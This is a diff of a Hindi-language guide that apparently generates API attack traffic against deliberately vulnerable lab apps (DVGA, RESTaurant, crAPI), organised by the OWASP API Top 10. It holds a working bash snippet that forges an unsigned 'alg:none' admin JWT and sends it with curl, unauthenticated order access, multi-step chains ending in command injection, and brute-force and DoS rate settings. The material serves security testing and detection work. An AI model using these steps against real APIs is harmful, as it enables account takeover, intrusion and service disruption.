+#### चुनौती 14 — बिना प्रमाणीकरण के ऑर्डर तक पहुँच
 
 ```bash
 # कोई Authorization हेडर नहीं — फिर भी डेटा लौटाता है
@@ -576,12 +576,12 @@ for i in 1 2 3 4 5; do
 done
 ```
 
-#### चुनौती 15 — JWT एल्गोरिथम कन्फ्यूज़न
+#### चुनौती 15 — JWT एल्गोरिदम भ्रम
 
 ```bash
-# एल्गोरिथम "none" के साथ JWT जालसाज़ी (कोई हस्ताक्षर सत्यापन नहीं):
-# 1. हेडर सेट करें: {"alg":"none","typ":"JWT"} और base64url-एन्कोड करें
-# 2. पेलोड सेट करें: {"email":"admin@example.com","role":"admin"} और base64url-एन्कोड करें
+# "none" एल्गोरिदम के साथ JWT जाली बनाएं (कोई हस्ताक्षर सत्यापन नहीं):
+# 1. header सेट करें: {"alg":"none","typ":"JWT"} और base64url-encode करें
+# 2. payload सेट करें: {"email":"admin@example.com","role":"admin"} और base64url-encode करें
 # 3. डॉट्स से जोड़ें, हस्ताक्षर खाली छोड़ें: <header>.<payload>.
 HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
@@ -593,27 +593,27 @@ curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
 
 ---
 
-## OWASP API सुरक्षा शीर्ष 10 क्रॉस-रेफरेंस
+## OWASP API सुरक्षा शीर्ष 10 क्रॉस-संदर्भ
 
 | OWASP श्रेणी | DVGA | RESTaurant | crAPI |
 |---|---|---|---|
 | **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | वाहन स्थान, मैकेनिक रिपोर्ट, ऑर्डर |
-| **API2: टूटा हुआ प्रमाणीकरण** | JWT जालसाज़ी (`me` क्वेरी) | JWT कमज़ोर सीक्रेट (97952) | OTP ब्रूट-फोर्स (v2), JWT एल्गोरिथम कन्फ्यूज़न |
-| **API3: BOPLA** | — | `PATCH /profile` (भूमिका वृद्धि) | वीडियो conversion_params, मैकेनिक ईमेल एक्सपोज़र |
-| **API4: संसाधन खपत** | बैच, रिकर्शन, एलियास, फील्ड डुप्लिकेशन DoS | प्रतिक्रिया लंबाई के माध्यम से उपयोगकर्ता एन्यूमरेशन | `contact_mechanic` repeat_request DoS |
+| **API2: Broken Auth** | JWT जालसाजी (`me` query) | JWT कमज़ोर secret (97952) | OTP ब्रूट-फ़ोर्स (v2), JWT एल्गोरिदम भ्रम |
+| **API3: BOPLA** | — | `PATCH /profile` (भूमिका उन्नयन) | Video conversion_params, मैकेनिक ईमेल एक्सपोज़र |
+| **API4: Resource Consumption** | Batch, recursion, alias, field duplication DoS | प्रतिक्रिया लंबाई के माध्यम से उपयोगकर्ता गणना | `contact_mechanic` repeat_request DoS |
 | **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | सामान्य उपयोगकर्ता के रूप में `DELETE /admin/videos` |
-| **API6: सामूहिक असाइनमेंट** | — | `PUT /orders` (status, quantity) | ऑर्डर status/quantity, वीडियो conversion_params |
-| **API7: SSRF** | `importPaste` म्यूटेशन | `PUT /menu` image_url | `contact_mechanic` mechanic_api URL |
-| **API8: इंजेक्शन** | SQL (`filter`), XSS (`content`), OS cmd (`importPaste`, `systemDiagnostics`) | OS cmd (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
-| **API9: अनुचित एसेट** | — | — | अप्रचलित `/auth/v2/check-otp` (कोई रेट लिमिट नहीं) |
-| **API10: असुरक्षित खपत** | — | — | (SSRF के माध्यम से अप्रत्यक्ष) |
-| **GraphQL-विशिष्ट** | इंट्रोस्पेक्शन, बैचिंग, रिकर्शन, एलियास, फील्ड डुप्लिकेशन, परिपत्र फ्रैगमेंट | — | — |
+| **API6: Mass Assignment** | — | `PUT /orders` (status, quantity) | ऑर्डर status/quantity, video conversion_params |
+| **API7: SSRF** | `importPaste` mutation | `PUT /menu` image_url | `contact_mechanic` mechanic_api URL |
+| **API8: Injection** | SQL (`filter`), XSS (`content`), OS cmd (`importPaste`, `systemDiagnostics`) | OS cmd (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
+| **API9: Improper Assets** | — | — | पुराना `/auth/v2/check-otp` (कोई दर सीमा नहीं) |
+| **API10: Unsafe Consumption** | — | — | (SSRF के माध्यम से अप्रत्यक्ष) |
+| **GraphQL-specific** | Introspection, batching, recursion, aliases, field duplication, circular fragments | — | — |
 
 ---
 
 ## ट्रैफ़िक जनरेशन पैटर्न
 
-### चरण 1: बेसलाइन (हैप्पी पाथ)
+### चरण 1: बेसलाइन (Happy Path)
 
 अटैक पैटर्न परीक्षण से पहले सामान्य API व्यवहार स्थापित करने के लिए वैध ट्रैफ़िक उत्पन्न करें।
 
@@ -640,31 +640,31 @@ curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${T
 
 ### चरण 2: OWASP श्रेणी के अनुसार अटैक ट्रैफ़िक
 
-**BOLA परीक्षण:** क्रमिक ID एन्यूमरेट करें, अनुरोधों में उपयोगकर्ता पहचानकर्ता बदलें, स्वामित्व के बिना संसाधनों तक पहुँचें।
+**BOLA परीक्षण:** अनुक्रमिक ID गणना करें, अनुरोधों में उपयोगकर्ता पहचानकर्ता बदलें, स्वामित्व के बिना संसाधनों तक पहुँचें।
 
-**इंजेक्शन परीक्षण:** filter/coupon पैरामीटर में SQL पेलोड, GraphQL क्वेरी इंजेक्शन, पैरामीटर फील्ड के माध्यम से OS कमांड इंजेक्शन।
+**Injection परीक्षण:** filter/coupon पैरामीटर में SQL पेलोड, GraphQL क्वेरी इंजेक्शन, पैरामीटर फ़ील्ड के माध्यम से OS कमांड इंजेक्शन।
 
-**प्रमाणीकरण बाईपास परीक्षण:** JWT टोकन जालसाज़ी, OTP ब्रूट-फोर्स, अप्रचलित API संस्करणों का उपयोग, एल्गोरिथम कन्फ्यूज़न।
+**Auth bypass परीक्षण:** JWT टोकन जाली बनाएं, OTP ब्रूट-फ़ोर्स करें, पुराने API संस्करण उपयोग करें, एल्गोरिदम भ्रम।
 
 **SSRF परीक्षण:** `importPaste`, `image_url`, और `mechanic_api` पैरामीटर में आंतरिक URL।
 
-**DoS परीक्षण:** GraphQL बैच/रिकर्शन/एलियास अटैक, उच्च गणना के साथ `repeat_request_if_failed`।
+**DoS परीक्षण:** GraphQL batch/recursion/alias अटैक, उच्च गिनती के साथ `repeat_request_if_failed`।
 
 ### चरण 3: स्टेटफुल अटैक चेन
 
-कुछ अटैक के लिए स्थिति सहित बहु-चरण अनुक्रम आवश्यक हैं:
+कुछ अटैक के लिए स्थिति के साथ बहु-चरण अनुक्रम आवश्यक हैं:
 
-1. **RESTaurant वृद्धि चेन:** पंजीकरण → टोकन → भूमिका को Chef तक PATCH → पुनः प्रमाणीकरण → कमांड इंजेक्शन
-2. **crAPI पूर्ण प्रवाह:** साइनअप → ईमेल सत्यापन (MailHog) → लॉगिन → वाहन जोड़ें → कॉन्टैक्ट मैकेनिक (SSRF) → ऑर्डर हेरफेर
-3. **DVGA रिकॉन-से-एक्सप्लॉइट:** इंट्रोस्पेक्शन → systemDiagnostics खोजें → एडमिन क्रेडेंशियल ब्रूट-फोर्स → OS कमांड निष्पादन
+1. **RESTaurant उन्नयन चेन:** पंजीकरण → टोकन → PATCH role to Chef → पुनः-auth → कमांड इंजेक्शन
+2. **crAPI पूर्ण प्रवाह:** Signup → ईमेल सत्यापन (MailHog) → Login → वाहन जोड़ें → Contact mechanic (SSRF) → ऑर्डर हेरफेर
+3. **DVGA recon-to-exploit:** Introspection → systemDiagnostics खोजें → एडमिन क्रेडेंशियल ब्रूट-फ़ोर्स → OS कमांड निष्पादन
 
-### रेट अनुशंसाएँ
+### दर अनुशंसाएँ
 
 | पैटर्न | अनुरोध/सेकंड | अवधि | नोट्स |
 |---|---|---|---|
-| बेसलाइन (प्रति ऐप) | 10-50 | 5 मिनट | सामान्य ट्रैफ़िक फ़िंगरप्रिंट स्थापित करें |
-| BOLA एन्यूमरेशन | 100-500 | 2 मिनट | क्रमिक ID स्कैनिंग |
-| OTP ब्रूट-फोर्स | 1000+ | मिलने तक | अधिकतम 10,000 प्रयास (4-अंकीय) |
+| बेसलाइन (प्रति ऐप) | 10-50 | 5 मिनट | सामान्य ट्रैफ़िक फिंगरप्रिंट स्थापित करें |
+| BOLA गणना | 100-500 | 2 मिनट | अनुक्रमिक ID स्कैनिंग |
+| OTP ब्रूट-फ़ोर्स | 1000+ | मिलने तक | अधिकतम 10,000 प्रयास (4-अंकीय) |
 | GraphQL DoS | 10-50 | 30 सेकंड | प्रत्येक अनुरोध सर्वर-साइड पर महँगा है |
-| इंजेक्शन फ़ज़िंग | 50-200 | 5 मिनट | प्रति अनुरोध पेलोड बदलें |
-| SSRF प्रोबिंग | 5-20 | 2 मिनट | धीमा; प्रत्येक सर्वर-साइड HTTP अनुरोध ट्रिगर करता है |
+| Injection fuzzing | 50-200 | 5 मिनट | प्रत्येक अनुरोध में पेलोड बदलें |
+| SSRF probing | 5-20 | 2 मिनट | धीमा; प्रत्येक सर्वर-साइड HTTP अनुरोध ट्रिगर करता है |
